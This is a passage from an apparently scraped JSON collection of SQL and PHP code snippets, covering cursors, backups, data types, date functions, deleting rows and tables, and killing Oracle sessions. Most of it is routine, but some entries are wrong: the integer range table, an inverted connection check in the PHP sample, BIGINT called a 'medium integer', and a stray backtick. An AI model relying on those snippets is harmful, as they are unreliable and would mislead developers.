    "description": "                                     DECLARE      @product_name VARCHAR(MAX),      @list_price   DECIMAL;  DECLARE cursor_product CURSOR FOR SELECT          product_name,          list_price     FROM          production.products;  OPEN cursor_product;  FETCH NEXT FROM cursor_product INTO      @product_name,      @list_price;  WHILE @@FETCH_STATUS = 0     BEGIN         PRINT @product_name + CAST(@list_price AS varchar);         FETCH NEXT FROM cursor_product INTO              @product_name,              @list_price;     END;  CLOSE cursor_product;  DEALLOCATE cursor_product; \nDECLARE @name VARCHAR(50) -- database name  DECLARE @path VARCHAR(256) -- path for backup files  DECLARE @fileName VARCHAR(256) -- filename for backup  DECLARE @fileDate VARCHAR(20) -- used for file name   SET @path = 'C:\\Backup\\'   SELECT @fileDate = CONVERT(VARCHAR(20),GETDATE(),112)   DECLARE db_cursor CURSOR FOR  SELECT name  FROM MASTER.dbo.sysdatabases  WHERE name NOT IN ('master','model','msdb','tempdb')   OPEN db_cursor   FETCH NEXT FROM db_cursor INTO @name    WHILE @@FETCH_STATUS = 0   BEGIN         SET @fileName = @path + @name + '_' + @fileDate + '.BAK'        BACKUP DATABASE @name TO DISK = @fileName         FETCH NEXT FROM db_cursor INTO @name  END   CLOSE db_cursor   DEALLOCATE db_cursor \n                                     DECLARE      @product_name VARCHAR(MAX),      @list_price   DECIMAL;  DECLARE cursor_product CURSOR FOR SELECT          product_name,          list_price     FROM          production.products;  OPEN cursor_product;  FETCH NEXT FROM cursor_product INTO      @product_name,      @list_price;  WHILE @@FETCH_STATUS = 0     BEGIN         PRINT @product_name + CAST(@list_price AS varchar);         FETCH NEXT FROM cursor_product INTO              @product_name,              @list_price;     END;  CLOSE cursor_product;  DEALLOCATE cursor_product; Code language: SQL (Structured Query Language) (sql)\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3841,
    "keyword": null,
    "link": null,
    "title": " sql cursor example",
    "description": "                                     DECLARE      @product_name VARCHAR(MAX),      @list_price   DECIMAL;  DECLARE cursor_product CURSOR FOR SELECT          product_name,          list_price     FROM          production.products;  OPEN cursor_product;  FETCH NEXT FROM cursor_product INTO      @product_name,      @list_price;  WHILE @@FETCH_STATUS = 0     BEGIN         PRINT @product_name + CAST(@list_price AS varchar);         FETCH NEXT FROM cursor_product INTO              @product_name,              @list_price;     END;  CLOSE cursor_product;  DEALLOCATE cursor_product; \nDECLARE @name VARCHAR(50) -- database name  DECLARE @path VARCHAR(256) -- path for backup files  DECLARE @fileName VARCHAR(256) -- filename for backup  DECLARE @fileDate VARCHAR(20) -- used for file name   SET @path = 'C:\\Backup\\'   SELECT @fileDate = CONVERT(VARCHAR(20),GETDATE(),112)   DECLARE db_cursor CURSOR FOR  SELECT name  FROM MASTER.dbo.sysdatabases  WHERE name NOT IN ('master','model','msdb','tempdb')   OPEN db_cursor   FETCH NEXT FROM db_cursor INTO @name    WHILE @@FETCH_STATUS = 0   BEGIN         SET @fileName = @path + @name + '_' + @fileDate + '.BAK'        BACKUP DATABASE @name TO DISK = @fileName         FETCH NEXT FROM db_cursor INTO @name  END   CLOSE db_cursor   DEALLOCATE db_cursor \n                                     DECLARE      @product_name VARCHAR(MAX),      @list_price   DECIMAL;  DECLARE cursor_product CURSOR FOR SELECT          product_name,          list_price     FROM          production.products;  OPEN cursor_product;  FETCH NEXT FROM cursor_product INTO      @product_name,      @list_price;  WHILE @@FETCH_STATUS = 0     BEGIN         PRINT @product_name + CAST(@list_price AS varchar);         FETCH NEXT FROM cursor_product INTO              @product_name,              @list_price;     END;  CLOSE cursor_product;  DEALLOCATE cursor_product; Code language: SQL (Structured Query Language) (sql)\nA SQL Server cursor is a set of T-SQL logic to loop over a predetermined number of rows one at a time. The purpose for the cursor may be to update one row at a time or perform an administrative process such as SQL Server database backups in a sequential manner.\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3842,
    "keyword": null,
    "link": null,
    "title": " sql data types",
    "description": "DATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\n# Numeric Types BIT\tTINYINT SMALLINT INT BIGINT DECIMAL NUMERIC FLOAT REAL  # Date & Time Types DATE TIME DATETIME TIMESTAMP YEAR  # Char & String Types (N) Denotes Unicode Versions CHAR VARCHAR TEXT NCHAR NVARCHAR NTEXT  # Binary Data Types BINARY VARBINARY IMAGE  # Misc CLOB BLOB XML JSON\n&bull; number(num) - whole numbers up to num digits &bull; number(num,num2) - num whole numbers up to num2 decimals &bull; char(num) - fixed length character/string &bull; varchar2(num) - used for varying length data &bull; date - full date &bull; currency - used for prices \n-- Text Data Types: CHAR(size) Fixed length string which can contain letters, numbers and special characters. The size parameter sets the maximum string length, from 0 &ndash; 255 with a default of 1. VARCHAR(size) Variable length string similar to CHAR(), but with a maximum string length range from 0 to 65535. BINARY(size) Similar to CHAR() but stores binary byte strings. VARBINARY(size) Similar to VARCHAR() but for binary byte strings. TINYBLOB Holds Binary Large Objects (BLOBs) with a max length of 255 bytes. TINYTEXT Holds a string with a maximum length of 255 characters. Use VARCHAR() instead, as it&rsquo;s fetched much faster. TEXT(size) Holds a string with a maximum length of 65535 bytes. Again, better to use VARCHAR(). BLOB(size) Holds Binary Large Objects (BLOBs) with a max length of 65535 bytes. MEDIUMTEXT Holds a string with a maximum length of 16,777,215 characters. MEDIUMBLOB Holds Binary Large Objects (BLOBs) with a max length of 16,777,215 bytes. LONGTEXT Holds a string with a maximum length of 4,294,967,295 characters. LONGBLOB Holds Binary Large Objects (BLOBs) with a max length of 4,294,967,295 bytes. ENUM(a, b, c, etc&hellip;) A string object that only has one value, which is chosen from a list of values which you define, up to a maximum of 65535 values. If a value is added which isn&rsquo;t on this list, it&rsquo;s replaced with a blank value instead. Think of ENUM being similar to HTML radio boxes in this regard. CREATE TABLE tshirts (color ENUM(&lsquo;red&rsquo;, &lsquo;green&rsquo;, &lsquo;blue&rsquo;, &lsquo;yellow&rsquo;, &lsquo;purple&rsquo;)); SET(a, b, c, etc&hellip;) A string object that can have 0 or more values, which is chosen from a list of values which you define, up to a maximum of 64 values. Think of SET being similar to HTML checkboxes in this regard.\nSELECT TYPEOF(value);\n-- Numeric Data Types: BIT(size) A bit-value type with a default of 1. The allowed number of bits in a value is set via the size parameter, which can hold values from 1 to 64. TINYINT(size) A very small integer with a signed range of -128 to 127, and an unsigned range of 0 to 255. Here, the size parameter specifies the maximum allowed display width, which is 255. BOOL Essentially a quick way of setting the column to TINYINT with a size of 1. 0 is considered false, whilst 1 is considered true. BOOLEAN Same as BOOL. SMALLINT(size) A small integer with a signed range of -32768 to 32767, and an unsigned range from 0 to 65535. Here, the size parameter specifies the maximum allowed display width, which is 255. MEDIUMINT(size) A medium integer with a signed range of -8388608 to 8388607, and an unsigned range from 0 to 16777215. Here, the size parameter specifies the maximum allowed display width, which is 255. INT(size) A medium integer with a signed range of -2147483648 to 2147483647, and an unsigned range from 0 to 4294967295. Here, the size parameter specifies the maximum allowed display width, which is 255. INTEGER(size) Same as INT. BIGINT(size) A medium integer with a signed range of -9223372036854775808 to 9223372036854775807, and an unsigned range from 0 to 18446744073709551615. Here, the size parameter specifies the maximum allowed display width, which is 255. FLOAT(p) A floating point number value. If the precision (p) parameter is between 0 to 24, then the data type is set to FLOAT(), whilst if its from 25 to 53, the data type is set to DOUBLE(). This behaviour is to make the storage of values more efficient. DOUBLE(size, d) A floating point number value where the total digits are set by the size parameter, and the number of digits after the decimal point is set by the d parameter. DECIMAL(size, d) An exact fixed point number where the total number of digits is set by the size parameters, and the total number of digits after the decimal point is set by the d parameter. For size, the maximum number is 65 and the default is 10, whilst for d, the maximum number is 30 and the default is 10. DEC(size, d) Same as DECIMAL.\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3843,
    "keyword": null,
    "link": null,
    "title": " sql database connectivity",
    "description": " <?php $db_host = \"localhost\"; $db_user = \"your database username\"; $db_password = \"your database password\"; $db_name = \"your database name\";  $conn =  mysqli_connect($db_host, $db_user, $db_password, $db_name); // mysql_connect($db_host, $db_user, $db_password) or die('error'); // mysql_select_db('db_name')  or die('db not found'); // echo 'connected';  if(!$conn->connect_error){     die(\"connection failed \". mysqli_connect_error());           }     // echo\"connected\";     if(mysqli_query($conn, $db_name)){         echo \"Database created\";     }else{         echo \"error creating database\";     }     mysqli_close($conn);   ?>\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3844,
    "keyword": null,
    "link": null,
    "title": " sql database size",
    "description": "USE <database_name>; EXEC sp_spaceused;\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3845,
    "keyword": null,
    "link": null,
    "title": " sql datatypes range",
    "description": " Datatypes   tinyint  Signed Integer ranges  -2^8 to 2^8 -1   Unsigned integer ranges  0 to 2^8 -1   Small int   Signed Integer ranges  -2^16 to 2^16-1   Unsigned integer ranges  0 to 2^8 -1   mediumint   Signed Integer ranges  -2^24 to 2^24 -1   Unsigned integer ranges  0 to 2^24 -1   Integer,int   Signed Integer ranges  -2^32 to 2^32-1   Unsigned integer ranges  0 to 2^32-1   bigint   Signed Integer ranges  -2^64 to 2^64-1   Unsigned integer ranges  0 to 2^64-1    \n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3846,
    "keyword": null,
    "link": null,
    "title": " sql date d'aujourd'hui",
    "description": "SELECT NOW(); -- Cela va retourner une date de la forme : -- \t\tYYYY-MM-DD HH:MM:SS -- Par exemple : 2020-10-11 13:06:53\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3847,
    "keyword": null,
    "link": null,
    "title": " sql date format picture ends before converting entire input string",
    "description": "-- NOTE: this is only applicable for Oracle and/or PL/SQL  -- Example (let's say you get the error for your date of '2020-09-25 14:18:15') TO_DATE('2020-09-25 14:18:15', 'YYYY-MM-DD HH24:MI:SS') -- instead of '2020-09-25 14:18:15' only  -- Syntax TO_DATE('<your-date-time>', '<your-date-time-format>')  /*    Formatting placeholders  +---------------------------------------------------------------------------------------------------- |  PARAMETER                      EXPLANATION          +---------------------------------------------------------------------------------------------------- |  YEAR      ----------------->   Year, spelled out            |  YYYY      ----------------->   4-digit year            |  YYY       ----------------->   Last 3, 2, or 1 digit(s) of year.            |  YY        ----------------->   YY    |  Y         ----------------->   Y    |  IYY       ----------------->   Last 3, 2, or 1 digit(s) of ISO year.            |  IY        ----------------->   IY    |  I         ----------------->   I    |  IYYY      ----------------->   4-digit year based on the ISO standard            |  RRRR      ----------------->   Accepts a 2-digit year and returns a 4-digit year.            |                                 A value between 0-49 will return a 20xx year.         |                                 A value between 50-99 will return a 19xx year.         |  Q         ----------------->   Quarter of year (1, 2, 3, 4; JAN-MAR = 1).         |  MM        ----------------->   Month (01-12; JAN = 01).         |  MON       ----------------->   Abbreviated name of month.            |  MONTH     ----------------->   Name of month, padded with blanks to length of 9 characters.            |  RM        ----------------->   Roman numeral month (I-XII; JAN = I).         |  WW        ----------------->   Week of year (1-53) where week 1 starts on the first day of the year and continues to the seventh day of the year.         |  W         ----------------->   Week of month (1-5) where week 1 starts on the first day of the month and ends on the seventh.         |  IW        ----------------->   Week of year (1-52 or 1-53) based on the ISO standard.         |  D         ----------------->   Day of week (1-7).         |  DAY       ----------------->   Name of day.            |  DD        ----------------->   Day of month (1-31).         |  DDD       ----------------->   Day of year (1-366).            |  DY        ----------------->   Abbreviated name of day.         |  J         ----------------->   Julian day; the number of days since January 1, 4712 BC.         |  HH        ----------------->   Hour of day (1-12).         |  HH12      ----------------->   Hour of day (1-12).            |  HH24      ----------------->   Hour of day (0-23).            |  MI        ----------------->   Minute (0-59).         |  SS        ----------------->   Second (0-59).         |  SSSSS     ----------------->   Seconds past midnight (0-86399).            |  AM, A.M., PM, or P.M. ----->   Meridian indicator  |  AD or A.D ----------------->   AD indicator                  |  BC or B.C.----------------->   BC indicator                  |  TZD       ----------------->   Daylight savings information. For example, 'PST'            |  TZH       ----------------->   Time zone hour.            |  TZM       ----------------->   Time zone minute.            |  TZR       ----------------->   Time zone region. +---------------------------------------------------------------------------------------------------- */ \n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3848,
    "keyword": null,
    "link": null,
    "title": " sql date functions",
    "description": " select * from test   where date between '03/19/2014' and '03/19/2014 23:59:59'\nUPDATE TABLE    SET EndDate = CAST('2009-05-25' AS DATETIME)  WHERE Id = 1\nDATE - format YYYY-MM-DD DATETIME - format: YYYY-MM-DD HH:MI:SS TIMESTAMP - format: YYYY-MM-DD HH:MI:SS YEAR - format YYYY or YY\nADDDATE Add a date interval (eg: 10 DAY) to a date (eg: 20/01/20) and return the result (eg: 20/01/30). ADDTIME Add a time interval (eg: 02:00) to a time or datetime (05:00) and return the result (07:00). CURDATE Get the current date. CURRENT_DATE Same as CURDATE. CURRENT_TIME Get the current time. CURRENT_ TIMESTAMP Get the current date and time. CURTIME Same as CURRENT_TIME. DATE Extracts the date from a datetime expression. DATEDIFF Returns the number of days between the 2 given dates. DATE_ADD Same as ADDDATE. DATE_FORMAT Formats the date to the given pattern. DATE_SUB Subtract a date interval (eg: 10 DAY) to a date (eg: 20/01/20) and return the result (eg: 20/01/10). DAY Returns the day for the given date. DAYNAME Returns the weekday name for the given date. DAYOFWEEK Returns the index for the weekday for the given date. DAYOFYEAR Returns the day of the year for the given date. EXTRACT Extract from the date the given part (eg MONTH for 20/01/20 = 01). FROM DAYS Return the date from the given numeric date value. HOUR Return the hour from the given date. LAST DAY Get the last day of the month for the given date. LOCALTIME Gets the current local date and time. LOCALTIMESTAMP Same as LOCALTIME. MAKEDATE Creates a date and returns it, based on the given year and number of days values. MAKETIME Creates a time and returns it, based on the given hour, minute and second values. MICROSECOND Returns the microsecond of a given time or datetime. MINUTE Returns the minute of the given time or datetime. MONTH Returns the month of the given date. MONTHNAME Returns the name of the month of the given date. NOW Same as LOCALTIME. PERIOD_ADD Adds the given number of months to the given period. PERIOD_DIFF Returns the difference between 2 given periods. QUARTER Returns the year quarter for the given date. SECOND Returns the second of a given time or datetime. SEC_TO_TIME Returns a time based on the given seconds. STR_TO_DATE Creates a date and returns it based on the given string and format. SUBDATE Same as DATE_SUB. SUBTIME Subtracts a time interval (eg: 02:00) to a time or datetime (05:00) and return the result (03:00). SYSDATE Same as LOCALTIME. TIME Returns the time from a given time or datetime. TIME_FORMAT Returns the given time in the given format TIME_TO_SEC Converts and returns a time into seconds. TIMEDIFF Returns the difference between 2 given time/datetime expressions. TIMESTAMP Returns the datetime value of the given date or datetime. TO_DAYS Returns the total number of days that have passed from &lsquo;00-00- 0000&rsquo; to the given date. WEEK Returns the week number for the given date. WEEKDAY Returns the weekday number for the given date. WEEKOFYEAR Returns the week number for the given date. YEAR Returns the year from the given date. YEARWEEK Returns the year and week number for the given date.\n select * from test   where datediff(day, date, '03/19/2014') = 0\nSELECT NOW(); \n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3849,
    "keyword": null,
    "link": null,
    "title": " sql date with year",
    "description": "... WHERE YEAR(date_field) = '2021'\n",
    "reg_date": "2021-10-12T10:00:07.000Z"
  },
  {
    "id": 3850,
    "keyword": null,
    "link": null,
    "title": " sql datediff hours and minutes",
    "description": "Small change like this can be done    SELECT  EmplID         , EmplName         , InTime         , [TimeOut]         , [DateVisited]         , CASE WHEN minpart=0          THEN CAST(hourpart as nvarchar(200))+':00'          ELSE CAST((hourpart-1) as nvarchar(200))+':'+ CAST(minpart as nvarchar(200))END as 'total time'         FROM          (         SELECT   EmplID, EmplName, InTime, [TimeOut], [DateVisited],         DATEDIFF(Hour,InTime, [TimeOut]) as hourpart,          DATEDIFF(minute,InTime, [TimeOut])` as minpart           from times) source\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3851,
    "keyword": null,
    "link": null,
    "title": " sql datetime as date",
    "description": "      SELECT      CONVERT(DATE, GETDATE()) date; \n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3852,
    "keyword": null,
    "link": null,
    "title": " sql day from datetime",
    "description": "SELECT DATENAME(dw,'09/23/2013') as theDayName  \nSET @@lc_time_names = 'fr_FR'; SELECT DAYNAME('2000-01-01') dayname; +---------+ | dayname | +---------+ | samedi  | +---------+\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3853,
    "keyword": null,
    "link": null,
    "title": " sql decimal(18 0)",
    "description": "-- DECIMAL(p,s)     p: number of digits (lkeft+right)  s: number of digits (right) -- NUMERIC and DECIMAL are synonyms CREATE TABLE test.sql_decimal (     dec_col DECIMAL (4, 2)\t\t-- Max total 4 digits, including 2 after decimal ); INSERT INTO test.sql_decimal (dec_col) VALUES (10.05);\t\t-- OK 4 digits INSERT INTO test.sql_decimal (dec_col) VALUES (21.0425);\t-- KO\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3854,
    "keyword": null,
    "link": null,
    "title": " sql decimal to 2 places",
    "description": "CAST(MyNumber AS NUMERIC(18,2))\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3855,
    "keyword": null,
    "link": null,
    "title": " sql declare table variable",
    "description": "DECLARE @table_variable_name TABLE (     column_list );  Example: DECLARE @product_table TABLE (     product_name VARCHAR(MAX) NOT NULL,     brand_id INT NOT NULL,     list_price DEC(11,2) NOT NULL );\n-- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;\nDECLARE @TABLE TABLE( COL1 INT, COL2 VARCHAR(30))\nDECLARE @COURSE_ID AS INT, @COURSE_NAME VARCHAR (10); \n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3856,
    "keyword": null,
    "link": null,
    "title": " sql declare variable",
    "description": "-- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;\nDECLARE @TABLE TABLE( COL1 INT, COL2 VARCHAR(30))\nDECLARE @COURSE_ID AS INT, @COURSE_NAME VARCHAR (10); \nDECLARE  { @LOCAL_VARIABLE[AS] data_type  [ = value ] } \nOne way of doing this is to use database variables  create table testcalc (    id int(11) not null auto_increment,    num1 int(11) default null,    num2 int(11) default null,    num3 int(11) default null,    num4 int(11) default null,    primary key(id) );  insert into testcalc values (default, 1, 2, 3, 4), (default, 5, 10, 15, 20); Then you can get the same results as in your example by storing the calculation results in variable syntax like this  @youVar := (calc) as resultName01 Then it will be available to following calculations to use like this  (@youVar + newCalc) as resultName02 We can apply it to your example like this  select    id,    num1,    num2,    num3,    num4,    @1plus2 := (num1 + num2) as 1plus2,                   # create var01    @1plus2mult3 := (@1plus2 * num3) as 1plus2mult3,      # create var02 using var01    @sumOfCalc := (@1plus2 + @1plus2mult3) as sumOfCalc   # create var03 using var01 and var02 from testcalc;\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3857,
    "keyword": null,
    "link": null,
    "title": " sql default",
    "description": "ALTER TABLE \"name_table\" ALTER \"name_column\"  SET DEFAULT value_default;\n//Sql Server  //Add a table  ALTER TABLE clients ADD Points INT DEFAULT 0 //Edit an existing table ALTER TABLE clients ADD CONSTRAINT points DEFAULT 0 FOR Points\nSets a default value for a column; Example 1 (MySQL): Creates a new table called Products which has a name column with a default value of &lsquo;Placeholder Name&rsquo; and an available_ from column with a default value of today&rsquo;s date. CREATE TABLE products ( id int, name varchar(255) DEFAULT 'Placeholder Name', available_from date DEFAULT GETDATE() ); Example 2 (MySQL): The same as above, but editing an existing table. ALTER TABLE products ALTER name SET DEFAULT 'Placeholder Name', ALTER available_from SET DEFAULT GETDATE();\nName Varchar(255) default \"Fred\"\nALTER TABLE PERSON ADD IS_ACTIVE VARCHAR2(1) DEFAULT 'N' NOT NULL\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3858,
    "keyword": null,
    "link": null,
    "title": " sql delete all values in a column",
    "description": "UPDATE TableName SET ColumnName = NULL\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3859,
    "keyword": null,
    "link": null,
    "title": " sql delete caracter list",
    "description": "UPDATE table_name SET field_name = replace(field_name, 'X', 'Y');\n",
    "reg_date": "2021-10-12T10:00:08.000Z"
  },
  {
    "id": 3860,
    "keyword": null,
    "link": null,
    "title": " sql delete column",
    "description": "ALTER TABLE `claims_user_settings` DROP COLUMN `super_user`;\nALTER TABLE \"table_name\" DROP \"column_name\";\nALTER TABLE tableName DROP COLUMN columnName;\nALTER TABLE tableName DROP columnName;\nUPDATE TableName SET ColumnName = NULL\nDeletes a column from a table. Example: Removes the first_name column from the users table. ALTER TABLE users DROP COLUMN first_name\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3861,
    "keyword": null,
    "link": null,
    "title": " sql delete duplicate",
    "description": "WITH cte AS (     SELECT          contact_id,          first_name,          last_name,          email,          ROW_NUMBER() OVER (             PARTITION BY                  first_name,                  last_name,                  email             ORDER BY                  first_name,                  last_name,                  email         ) row_num      FROM          sales.contacts ) DELETE FROM cte WHERE row_num > 1; \n-- Oracle DELETE films WHERE rowid NOT IN (     SELECT min(rowid)     FROM films     GROUP BY title, uk_release_date );\n# Step 1: Copy distinct values to temporary table CREATE TEMPORARY TABLE tmp_user (     SELECT id, name      FROM user     GROUP BY name );  # Step 2: Remove all rows from original table DELETE FROM user;  # Step 3: Remove all rows from original table INSERT INTO user (SELECT * FROM tmp_user);  # Step 4: Remove temporary table DROP TABLE tmp_user; \n--ID should be primary key  --get duplicate records using RANK SELECT E.ID,      E.firstname,      E.lastname,      E.country,      T.rank FROM [SampleDB].[dbo].[Employee] E   INNER JOIN (  SELECT *,          RANK() OVER(PARTITION BY firstname,                                   lastname,                                   country         ORDER BY id) rank  FROM [SampleDB].[dbo].[Employee] ) T ON E.ID = t.ID;  --delete duplications DELETE E     FROM [SampleDB].[dbo].[Employee] E          INNER JOIN     (         SELECT *,                 RANK() OVER(PARTITION BY firstname,                                          lastname,                                          country                ORDER BY id) rank         FROM [SampleDB].[dbo].[Employee]     ) T ON E.ID = t.ID     WHERE rank > 1;\nDistinct: helps to remove all the duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3862,
    "keyword": null,
    "link": null,
    "title": " sql delete duplicate rows but keep one",
    "description": "DELETE FROM dups a USING (       SELECT MIN(ctid) as ctid, key         FROM dups          GROUP BY key HAVING COUNT(*) > 1       ) b       WHERE a.key = b.key        AND a.ctid <> b.ctid\nWITH cte AS (     SELECT          contact_id,          first_name,          last_name,          email,          ROW_NUMBER() OVER (             PARTITION BY                  first_name,                  last_name,                  email             ORDER BY                  first_name,                  last_name,                  email         ) row_num      FROM          sales.contacts ) DELETE FROM cte WHERE row_num > 1; \n-- Oracle DELETE films WHERE rowid NOT IN (     SELECT min(rowid)     FROM films     GROUP BY title, uk_release_date );\n# Step 1: Copy distinct values to temporary table CREATE TEMPORARY TABLE tmp_user (     SELECT id, name      FROM user     GROUP BY name );  # Step 2: Remove all rows from original table DELETE FROM user;  # Step 3: Remove all rows from original table INSERT INTO user (SELECT * FROM tmp_user);  # Step 4: Remove temporary table DROP TABLE tmp_user; \n--ID should be primary key  --get duplicate records using RANK SELECT E.ID,      E.firstname,      E.lastname,      E.country,      T.rank FROM [SampleDB].[dbo].[Employee] E   INNER JOIN (  SELECT *,          RANK() OVER(PARTITION BY firstname,                                   lastname,                                   country         ORDER BY id) rank  FROM [SampleDB].[dbo].[Employee] ) T ON E.ID = t.ID;  --delete duplications DELETE E     FROM [SampleDB].[dbo].[Employee] E          INNER JOIN     (         SELECT *,                 RANK() OVER(PARTITION BY firstname,                                          lastname,                                          country                ORDER BY id) rank         FROM [SampleDB].[dbo].[Employee]     ) T ON E.ID = t.ID     WHERE rank > 1;\nDistinct: helps to remove all the duplicate records when retrieving the records from a table.  SELECT DISTINCT FIRST_NAME FROM VISITORS;\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3863,
    "keyword": null,
    "link": null,
    "title": " sql delete last row",
    "description": "DELETE FROM my_table WHERE my_col_id = (SELECT MAX(my_col_id) FROM my_table);\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3864,
    "keyword": null,
    "link": null,
    "title": " sql delete multiple conditions",
    "description": "DELETE FROM employees WHERE last_name = 'Johnson' AND employee_id >= 80;\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3865,
    "keyword": null,
    "link": null,
    "title": " sql delete table",
    "description": "DROP TABLE table_name;\nTRUNCATE TABLE  table_name; \n-- Drop, but no space gain DROP TABLE table_name; -- Really frees space (Oracle) DROP TABLE table_name PURGE;\nDeletes a table from a database. Example: Removes the users table. DROP TABLE users;\nDELETE FROM `table` WHERE condition\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3866,
    "keyword": null,
    "link": null,
    "title": " sql delete where in",
    "description": "-- Deletes all records where `columnName` matches the values in brackets. DELETE FROM tableName WHERE columnName IN ('val1', 'val2', 'val3');\nMit DELETE werden einzelne oder mehrere Datens&auml;tze gel&ouml;scht. Mit WHERE  werden nur bestimmte Datens&auml;tez gel&ouml;scht.     DELETE FROM suppliers   WHERE        supplier_name = 'Microsoft'; \n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3867,
    "keyword": null,
    "link": null,
    "title": " sql delete where in select",
    "description": "DELETE FROM tableA WHERE ROWID IN    ( SELECT q.ROWID     FROM tableA q       INNER JOIN tableB u on (u.qlabel = q.entityrole AND u.fieldnum = q.fieldnum)      WHERE (LENGTH(q.memotext) NOT IN (8,9,10) OR q.memotext NOT LIKE '%/%/%')       AND (u.FldFormat = 'Date')); \n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3868,
    "keyword": null,
    "link": null,
    "title": " sql delimiter to columns",
    "description": "SELECT       REVERSE(PARSENAME(REPLACE(REVERSE(myAddress), ',', '.'), 1)) AS [Street]    , REVERSE(PARSENAME(REPLACE(REVERSE(myAddress), ',', '.'), 2)) AS [City]    , REVERSE(PARSENAME(REPLACE(REVERSE(myAddress), ',', '.'), 3)) AS [State] FROM dbo.custAddress; GO\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3869,
    "keyword": null,
    "link": null,
    "title": " sql describe",
    "description": "-- As the name suggests, DESCRIBE is used to describe something. Since in database we have tables, that&rsquo;s why we use DESCRIBE or DESC(both are same) command to describe the structure of a table. Syntax:  DESCRIBE one;   OR DESC one; -- Note : We can use either DESCRIBE or DESC(both are Case Insensitive).  -- Suppose our table whose name is one has 3 columns named FIRST_NAME, LAST_NAME and SALARY and all are of can contain null values.\n",
    "reg_date": "2021-10-12T10:00:09.000Z"
  },
  {
    "id": 3870,
    "keyword": null,
    "link": null,
    "title": " sql developer connect to sql server",
    "description": "1. Download the jTDS 3rd party JDBC driver, version 1.2.8 from here https://sourceforge.net/projects/jtds/files/jtds/1.2.8/jtds-1.2.8-dist.zip/download  2. Save and extract the contents of the jtds-1.2.8-dist.zip file somewhere safe (ex: &ldquo;C:\\oracle\\sqldeveloper\\add-ons\\jtds-1.2.8-dist\\&rdquo;). 3. Start SQL Developer go to Tools > Preferences > Database > Third Party JDBC Drivers. 4. Click &ldquo;Add Entry&rdquo;, point to the &lsquo;jtds-1.2.8.jar&rsquo; file location, then select it and click OK. 5. Create a new connection, and choose the &ldquo;SQLServer&rdquo; tab. 6. Enter the following details: Connection Name (required for database retrieval), Username, Password, Hostname, and Port. 7. Click &ldquo;Retrieve database&rdquo; and select the appropriate database, then Save/Test/Connect as you would do normally.\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3871,
    "keyword": null,
    "link": null,
    "title": " sql developer kill query",
    "description": "-- Get ORACLE Session IDs (SID and SERIAL#) SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session (and wait for rollback if any...) ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3872,
    "keyword": null,
    "link": null,
    "title": " sql developer kill session",
    "description": "-- Get ORACLE Session IDs (SID and SERIAL#) SELECT SID, SERIAL#, STATUS, SERVER FROM V$SESSION WHERE USERNAME = '<username>'; -- Kill session (and wait for rollback if any...) ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3873,
    "keyword": null,
    "link": null,
    "title": " sql developer output",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3874,
    "keyword": null,
    "link": null,
    "title": " sql developer output to console",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; DECLARE \tv_name VARCHAR2(50) := 'Bond'; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); \tDBMS_OUTPUT.PUT_LINE('My name is ' || v_name); END;\n",
    "reg_date": "2021-10-12T10:00:10.000Z"
  },
  {
    "id": 3875,
    "keyword": null,
    "link": null,
    "title": " sql developer output variables",
